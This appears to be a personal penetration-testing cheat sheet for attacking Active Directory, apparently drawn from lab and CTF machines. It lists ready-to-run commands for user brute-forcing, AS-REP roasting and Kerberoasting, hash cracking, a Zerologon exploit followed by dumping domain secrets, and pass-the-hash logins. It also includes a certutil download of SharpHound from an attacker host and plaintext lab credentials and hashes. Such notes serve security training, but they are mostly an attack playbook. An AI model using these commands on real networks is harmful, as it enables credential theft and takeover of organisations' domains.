# Active Directory
* [Initial Scans](#initial-scans)
* [Credentials](#credentials)
  * [Remote Login](#remote-login)
  * [User Scans](#user-scans)
  * [Local Scans](#local-scans)
    * [Get All Objects](#get-all-objects)
* [Exploits](#exploits)
  * [Zero Login](#zero-login)


## Initial Scans
| Scan Type | Description | Command  |
| -------------------|-----------------------|:----------------------------------------------------------------------|
| LDAP   | Scan LDAP with nmap | `nmap -p 389 -sC -sV $ip` |
| LDAP  | Domain Enumeration | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip"` |
| LDAP  | Get User account description field | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip" \| grep description` |
| LDAP | Get User account with creds | `GetADUsers.py -all active.htb/svc_tgs -dc-ip $ip` |
| User Enumeration | Bruteforce scan for valid usernames | `kerbrute userenum --dc $ip -d zero.csl /usr/share/seclists/Usernames/Names/names.txt` |
| User Enumeration | Bruteforce scan for valid usernames | `kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain DICTIONARY -dc-ip $ip` |
| Get Hashes | list and get TGTs for those users without preauth set | `GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash` |
| Crack Hashes | Use John to crack hashes | `john hash --wordlist=/usr/share/wordlists/rockyou.txt ` |


## Credentials
### Remote Login
| Info | Command |
|:-----|:--------|
| RDP  | `remmina -c rdp://username@$ip` |
| WinRM | `evil-winrm -i $ip -u $user -p $pass` |
| Psexec | `psexec.py $domain/$user@$ip` |
| RPC | `rpcclient -U $user $ip` |
| SMB | `smbclient //$ip/$share -U "$user"` |

### User Scans
| Info | Command |
|:-----|:--------|
| Enumerate other users | `rpcclient -U "izabel" $ip; enumdomusers` |
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |

### Local Scans
#### Get All Objects
Code
```PowerShell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```
## Exploits
### Zero Login
`python3 cve-2020-1472-exploit.py -t $ip -n ZERO-DC`

`secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29`



## Steal Hashes

* From Userlist (Check if preauthentication is enabled (If not we can steal hashes))
`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py fusion.corp/ -no-pass -usersfile users.txt -request`
* Single Account (Check if we can get an account password to crack (ticket))
`python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass`
* Enumerate shares with credentials
`smbmap -H spookysec.local -u svc-admin -p management2005 -d spookysec.local`

* Dump Secrets
`secretsdump.py -just-dc backup:backup2517860@spookysec.local`
* Pass the hash
`evil-winrm -i $ip -H 0e0363213e37b94221497260b0bcb4fc --user Administrator`
* Connect using evil-winrm and creds
`evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'`

# Kerberoast
GetUserSPNs.py -request -dc-ip $ip active.htb/svc_tgs
